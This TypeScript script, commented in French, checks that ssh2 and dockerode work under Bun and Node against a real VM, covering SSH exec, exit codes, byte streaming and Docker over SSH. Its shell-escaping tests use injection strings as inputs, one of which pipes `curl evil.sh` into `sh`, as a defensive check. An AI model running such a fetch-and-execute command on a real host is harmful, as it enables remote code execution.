// Vérifie que ssh2 et dockerode fonctionnent réellement sur le runtime courant.
//
// CLAUDE.md pose cette question comme un préalable de Phase 1 : Bun est acquis
// comme gestionnaire de paquets, pas comme runtime du worker. `ssh2` embarque
// des addons natifs optionnels, et `dockerode` passe ici par un canal SSH — deux
// endroits où Bun peut diverger de Node sans prévenir.
//
// Le script se lance sous les deux et on compare :
//
//   bun  run packages/ssh-executor/src/verify.ts
//   node --experimental-strip-types packages/ssh-executor/src/verify.ts
//
// Il vise une vraie VM, pas un mock. La cible par défaut est celle du spike.
import { createHash, randomBytes } from "node:crypto";
import { readFileSync } from "node:fs";
import { homedir } from "node:os";
import { join } from "node:path";
import {
  connect,
  disconnect,
  dockerClient,
  exec,
  execArgv,
  execStream,
  quoteArg,
  type ServerCredentials,
} from "#index";

/** Empreinte relevée SUR la VM, pour la comparer à celle recalculée ici. */
let remoteDigest = "";
const WHITESPACE = /\s+/;

const HOST = process.env.TARGET_HOST ?? "192.168.252.3";
const USER = process.env.TARGET_USER ?? "ubuntu";
const KEY = process.env.SSH_KEY ?? join(homedir(), ".ssh", "id_ed25519");

const runtime =
  typeof globalThis.Bun === "undefined"
    ? `Node ${process.version}`
    : `Bun ${globalThis.Bun.version}`;

let pass = 0;
let fail = 0;
const ok = (m: string) => {
  pass += 1;
  console.log(`  [32m✓[0m ${m}`);
};
const ko = (m: string) => {
  fail += 1;
  console.log(`  [31m✗[0m ${m}`);
};

console.log(`\n[1mRuntime : ${runtime}[0m`);
console.log(`Cible   : ${USER}@${HOST}\n`);

// La clé ne doit jamais être journalisée, ni ici ni ailleurs.
const creds: ServerCredentials = {
  host: HOST,
  privateKey: readFileSync(KEY, "utf8"),
  user: USER,
};

// ── 1. Échappement shell (pur, testable sans réseau) ────────────────────────
{
  const nasty = `main'; curl evil.sh | sh; echo '`;
  const quoted = quoteArg(nasty);
  // Une fois échappée, la chaîne doit être un seul mot pour le shell : aucun
  // `;` ni `|` ne doit en sortir non protégé.
  const reopens =
    quoted.slice(1, -1).includes("'") && !quoted.includes(`'\\''`);
  if (quoted.startsWith("'") && quoted.endsWith("'") && !reopens) {
    ok("quoteArg neutralise une injection");
  } else {
    ko(`quoteArg laisse passer : ${quoted}`);
  }
}

let client: Awaited<ReturnType<typeof connect>> | undefined;

try {
  // ── 2. Connexion SSH ────────────────────────────────────────────────────
  client = await connect(creds);
  ok("ssh2 : connexion établie");

  // ── 3. exec + capture de sortie ─────────────────────────────────────────
  const uname = await exec(client, "uname -sr");
  if (uname.code === 0 && uname.stdout.trim()) {
    ok(`ssh2 exec : ${uname.stdout.trim()}`);
  } else {
    ko(`ssh2 exec a échoué (code ${uname.code})`);
  }

  // ── 4. Code de sortie non nul remonté correctement ──────────────────────
  const failing = await exec(client, "exit 42");
  if (failing.code === 42) {
    ok("ssh2 exec : code de sortie propagé (42)");
  } else {
    ko(`code attendu 42, reçu ${failing.code}`);
  }

  // ── 5. execArgv : l'argument reste un seul mot ──────────────────────────
  const injected = await execArgv(client, ["echo", "a; touch /tmp/pwned; b"]);
  const clean =
    injected.stdout.trim() === "a; touch /tmp/pwned; b" &&
    (await exec(client, "test -e /tmp/pwned")).code !== 0;
  if (clean) {
    ok("execArgv : injection neutralisée sur un vrai shell");
  } else {
    ko(`execArgv a laissé passer : ${injected.stdout.trim()}`);
  }

  // ── 6. Streaming ligne à ligne (base du flux SSE des logs) ──────────────
  let chunks = 0;
  await exec(client, "for i in 1 2 3; do echo ligne-$i; sleep 0.2; done", {
    onStdout: () => {
      chunks += 1;
    },
  });
  if (chunks > 0) {
    ok(`streaming : ${chunks} fragment(s) reçus au fil de l'eau`);
  } else {
    ko("streaming : aucun fragment reçu");
  }

  // ── 7. execStream : des OCTETS, pas du texte ────────────────────────────
  // Le chemin des sauvegardes. `exec()` concatène en UTF-8 : sur un dump
  // binaire il corrompt les octets. On fabrique 8 Mio d'aléa sur la VM, on
  // relève son sha256 LÀ-BAS, puis on le fait traverser le canal et on
  // recalcule ICI. Deux empreintes identiques prouvent le transport.
  const REMOTE_BLOB = "/tmp/noddle-execstream-probe.bin";
  await exec(
    client,
    `head -c 8388608 /dev/urandom > ${REMOTE_BLOB} && sha256sum ${REMOTE_BLOB}`
  ).then((r) => {
    remoteDigest = r.stdout.trim().split(WHITESPACE)[0] ?? "";
  });

  const streamed = await execStream(
    client,
    `cat ${REMOTE_BLOB}`,
    async ({ stdout }) => {
      const hash = createHash("sha256");
      let bytes = 0;
      for await (const chunk of stdout) {
        bytes += (chunk as Buffer).length;
        hash.update(chunk as Buffer);
      }
      return { bytes, digest: hash.digest("hex") };
    }
  );

  if (streamed.value.bytes === 8_388_608) {
    ok(`execStream : ${streamed.value.bytes} octets traversés`);
  } else {
    ko(`execStream : ${streamed.value.bytes} octets, attendu 8388608`);
  }
  if (streamed.value.digest === remoteDigest) {
    ok(
      `execStream : sha256 identique de bout en bout (${remoteDigest.slice(0, 16)}…)`
    );
  } else {
    ko(
      `execStream : sha256 DIFFÉRENT — ${streamed.value.digest} vs ${remoteDigest}`
    );
  }
  if (streamed.code === 0) {
    ok("execStream : code de sortie 0 relevé après le flux");
  } else {
    ko(`execStream : code ${streamed.code}, attendu 0`);
  }

  // ── 8. Le cas qui décide de tout : sortie complète, code NON nul ───────
  // C'est la forme exacte d'un pg_dump tué en cours : des octets valides
  // arrivent, le flux se ferme proprement, et RIEN dans les octets ne dit
  // qu'il en manque. Si le code de sortie ne remontait pas, une demi-
  // sauvegarde serait enregistrée comme réussie.
  const truncated = await execStream(
    client,
    "echo -n 'moitie-de-dump'; exit 3",
    async ({ stdout }) => {
      let bytes = 0;
      for await (const chunk of stdout) {
        bytes += (chunk as Buffer).length;
      }
      return bytes;
    }
  );
  if (truncated.value > 0 && truncated.code === 3) {
    ok(
      `execStream : ${truncated.value} octets reçus ET code ${truncated.code} — un dump tronqué est détectable`
    );
  } else {
    ko(
      `execStream : octets=${truncated.value} code=${truncated.code}, attendu >0 et 3`
    );
  }

  // ── 9. Entrée standard — le chemin de la restauration ──────────────────
  const payload = randomBytes(1_048_576);
  const expectedIn = createHash("sha256").update(payload).digest("hex");
  const pushed = await execStream(
    client,
    "sha256sum | cut -d' ' -f1",
    async ({ stdin, stdout }) => {
      let out = "";
      stdout.setEncoding("utf8");
      const collected = new Promise<void>((res) => {
        stdout.on("data", (d: string) => {
          out += d;
        });
        stdout.on("end", () => res());
      });
      await new Promise<void>((res, rej) => {
        stdin.write(payload, (e) => (e ? rej(e) : res()));
      });
      stdin.end();
      await collected;
      return out.trim();
    }
  );
  if (pushed.value === expectedIn) {
    ok("execStream : 1 Mio poussé par stdin, sha256 confirmé à distance");
  } else {
    ko(`execStream stdin : ${pushed.value} vs ${expectedIn}`);
  }

  await exec(client, `rm -f ${REMOTE_BLOB}`);

  // ── 10. dockerode à travers le tunnel SSH ────────────────────────────────
  const docker = dockerClient(client);
  const version = await docker.version();
  if (version?.Version) {
    ok(
      `dockerode via SSH : Docker ${version.Version} (API ${version.ApiVersion})`
    );
  } else {
    ko("dockerode : réponse de version vide");
  }

  // ── 11. Lecture d'état structurée — ce pour quoi dockerode existe ────────
  // La Phase 0 a montré que `docker service update` renvoie 0 après un
  // rollback. L'état réel n'est lisible que dans UpdateStatus.
  const services = await docker.listServices();
  ok(`dockerode : ${services.length} service(s) listé(s)`);

  const spike = services.find((s) => s.Spec?.Name === "spike-app");
  if (spike) {
    const state = (spike as { UpdateStatus?: { State?: string } }).UpdateStatus
      ?.State;
    ok(
      `dockerode : UpdateStatus.State = ${state ?? "(aucun)"} — lisible sans parser du texte`
    );
  }
} catch (err) {
  ko(`exception : ${err instanceof Error ? err.message : String(err)}`);
  if (err instanceof Error && err.stack) {
    console.log(err.stack.split("\n").slice(1, 4).join("\n"));
  }
} finally {
  if (client) {
    disconnect(client);
  }
}

console.log(`\n[1m${runtime} — réussis ${pass}, échoués ${fail}[0m\n`);
process.exit(fail === 0 ? 0 : 1);
